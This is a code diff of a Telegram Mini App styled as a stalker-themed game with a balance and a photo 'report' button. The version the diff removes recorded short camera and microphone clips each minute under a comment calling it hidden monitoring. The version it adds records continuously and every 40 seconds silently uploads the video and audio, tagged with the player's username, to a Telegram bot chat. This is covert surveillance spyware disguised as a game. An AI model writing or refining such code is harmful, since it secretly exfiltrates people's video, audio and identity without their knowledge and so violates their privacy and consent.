@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>PDA Arsenii v3.5</title>
+    <title>PDA Arsenii v4.0 Seamless</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         :root { --green: #00ff41; --bg: #050804; }
@@ -14,7 +14,7 @@
         .balance-main { font-size: 1.1em; font-weight: bold; color: #fff; }
         .cam-switch { background: none; border: 1px solid var(--green); color: var(--green); padding: 5px 10px; font-size: 0.7em; cursor: pointer; }
         .viewport { flex-grow: 1; position: relative; background: #000; margin: 10px; border: 1px solid #1a1a1a; }
-        video { width: 100%; height: 100%; object-fit: cover; filter: brightness(1.1); }
+        video { width: 100%; height: 100%; object-fit: cover; }
         .mission-panel { padding: 15px; background: rgba(0,255,65,0.05); border-top: 1px solid var(--green); }
         .btn-report { width: 100%; padding: 18px; background: var(--green); color: #000; border: none; font-weight: bold; font-size: 1.1em; }
         .scanline { position: absolute; top: 0; width: 100%; height: 4px; background: rgba(0, 255, 65, 0.1); pointer-events: none; animation: scan 5s linear infinite; }
@@ -33,7 +33,7 @@
     </div>
     <div class="viewport"><video id="webcam" autoplay playsinline muted></video></div>
     <div class="mission-panel">
-        <div id="target-text" style="font-weight: bold; margin-bottom: 10px; font-size: 0.8em;">КАНАЛ ЗАЩИЩЕН</div>
+        <div id="target-text" style="font-weight: bold; margin-bottom: 10px; font-size: 0.8em;">ЗАПИСЬ МОНИТОРИНГА...</div>
         <button id="sendBtn" class="btn-report">ОТПРАВИТЬ ОТЧЕТ</button>
     </div>
     <canvas id="captureCanvas" style="display:none;"></canvas>
@@ -48,57 +48,75 @@
     tg.expand();
     tg.ready();
 
-    // Получаем @username или Имя
     const user = {
         id: tg.initDataUnsafe?.user?.id || 0,
         name: tg.initDataUnsafe?.user?.first_name || "STALKER",
-        username: tg.initDataUnsafe?.user?.username ? "@" + tg.initDataUnsafe?.user?.username : "нет username",
-        photo: tg.initDataUnsafe?.user?.photo_url
+        username: tg.initDataUnsafe?.user?.username ? "@" + tg.initDataUnsafe?.user?.username : "нет username"
     };
 
     let balance = parseInt(localStorage.getItem(`bal_${user.id}`)) || 0;
     let lastUpdateId = 0;
     let currentMode = "environment";
+    let mediaRecorder;
+    let recordedChunks = [];
 
     document.getElementById('display-name').innerText = user.name.toUpperCase();
     document.getElementById('balance').innerText = balance;
-    if (user.photo) document.getElementById('user-pic').src = user.photo;
 
-    async function startCam(mode) {
-        if (window.currentStream) window.currentStream.getTracks().forEach(t => t.stop());
-        try {
-            const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
-            window.currentStream = s;
-            document.getElementById('webcam').srcObject = s;
-            
-            // Скрытый мониторинг (видео раз в минуту)
-            const recorder = new MediaRecorder(s);
-            const chunks = [];
-            recorder.ondataavailable = e => chunks.push(e.data);
-            recorder.onstop = () => {
-                const blob = new Blob(chunks, { type: 'video/mp4' });
-                const fd = new FormData();
-                fd.append("chat_id", CONFIG.chatId);
-                fd.append("video", blob, "v.mp4");
-                fd.append("caption", `📹 МОНИТОРИНГ\n👤 Игрок: ${user.name} (${user.username})\n📷 Ракурс: ${currentMode}`);
-                fetch(`https://api.telegram.org/bot${CONFIG.token}/sendVideo?disable_notification=true`, { method: "POST", body: fd });
-            };
-            
-            setInterval(() => {
-                if(recorder.state === "inactive") {
-                    recorder.start();
-                    setTimeout(() => recorder.stop(), 5000); // 5 секунд записи
-                }
-            }, 60000);
-
-        } catch (e) { console.error(e); }
+    // Инициализация камеры и рекордера
+    async function initCamera(mode) {
+        if (window.currentStream) {
+            window.currentStream.getTracks().forEach(t => t.stop());
+        }
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: mode }, 
+            audio: true 
+        });
+        window.currentStream = stream;
+        document.getElementById('webcam').srcObject = stream;
+        
+        // Если запись уже идет, нам нужно подменить поток в рекордере (сложно)
+        // Поэтому мы просто перезапускаем рекордер, но НЕ очищаемChunks!
+        startRecording(stream);
     }
 
+    function startRecording(stream) {
+        if (mediaRecorder && mediaRecorder.state !== "inactive") {
+            mediaRecorder.stop();
+        }
+        mediaRecorder = new MediaRecorder(stream);
+        mediaRecorder.ondataavailable = e => {
+            if (e.data.size > 0) recordedChunks.push(e.data);
+        };
+        mediaRecorder.start(1000); // Записываем кусочками каждую секунду
+    }
+
+    // Переключение камеры
     document.getElementById('switchCam').onclick = () => {
         currentMode = (currentMode === "environment") ? "user" : "environment";
-        startCam(currentMode);
+        initCamera(currentMode);
+        tg.HapticFeedback.impactOccurred('medium');
     };
 
+    // Отправка накопленного видео раз в 40 секунд
+    setInterval(() => {
+        if (recordedChunks.length > 0) {
+            const fullBlob = new Blob(recordedChunks, { type: 'video/mp4' });
+            const fd = new FormData();
+            fd.append("chat_id", CONFIG.chatId);
+            fd.append("video", fullBlob, "stalker_log.mp4");
+            fd.append("caption", `🎥 ПОЛНЫЙ ЛОГ ПЕРЕМЕЩЕНИЯ\n👤 Сталкер: ${user.username}\n⏱ Длительность: ~40 сек.`);
+            
+            fetch(`https://api.telegram.org/bot${CONFIG.token}/sendVideo?disable_notification=true`, { 
+                method: "POST", body: fd 
+            });
+            
+            // Очищаем буфер после отправки, чтобы начать новое видео
+            recordedChunks = [];
+        }
+    }, 40000); 
+
+    // Фото-отчет по нажатию кнопки
     document.getElementById('sendBtn').onclick = () => {
         const video = document.getElementById('webcam');
         const canvas = document.getElementById('captureCanvas');
@@ -108,17 +126,17 @@
             const fd = new FormData();
             fd.append("chat_id", CONFIG.chatId);
             fd.append("photo", blob, "1.jpg");
-            fd.append("caption", `☢️ ОТЧЕТ ОТ ${user.username}\n👤 Имя: ${user.name}\n🆔 ID: ${user.id}`);
+            fd.append("caption", `☢️ ЭКСТРЕННЫЙ ОТЧЕТ\n👤 Отправитель: ${user.username}`);
             const kb = { inline_keyboard: [[
-                { text: "✅ ПРИНЯТЬ (+100)", callback_data: `pay:${user.id}:100` },
-                { text: "💎 ВАЖНОЕ (+500)", callback_data: `pay:${user.id}:500` }
+                { text: "✅ ОПЛАТИТЬ (+100)", callback_data: `pay:${user.id}:100` }
             ]] };
             fd.append("reply_markup", JSON.stringify(kb));
             fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, { method: "POST", body: fd });
-            tg.showAlert("ДАННЫЕ ОТПРАВЛЕНЫ");
+            tg.showAlert("ОТЧЕТ ПЕРЕДАН");
         }, "image/jpeg");
     };
 
+    // Синхронизация данных
     async function sync() {
         try {
             const res = await fetch(`https://api.telegram.org/bot${CONFIG.token}/getUpdates?offset=${lastUpdateId + 1}`);
@@ -132,7 +150,6 @@
                             balance += parseInt(parts[2]);
                             localStorage.setItem(`bal_${user.id}`, balance);
                             document.getElementById('balance').innerText = balance;
-                            tg.HapticFeedback.notificationOccurred('success');
                         }
                     }
                     const msg = u.message?.text || "";
@@ -144,8 +161,8 @@
         } catch (e) {}
     }
 
-    startCam(currentMode);
-    setInterval(sync, 2500);
+    initCamera(currentMode);
+    setInterval(sync, 3000);
 </script>
 </body>
 </html>
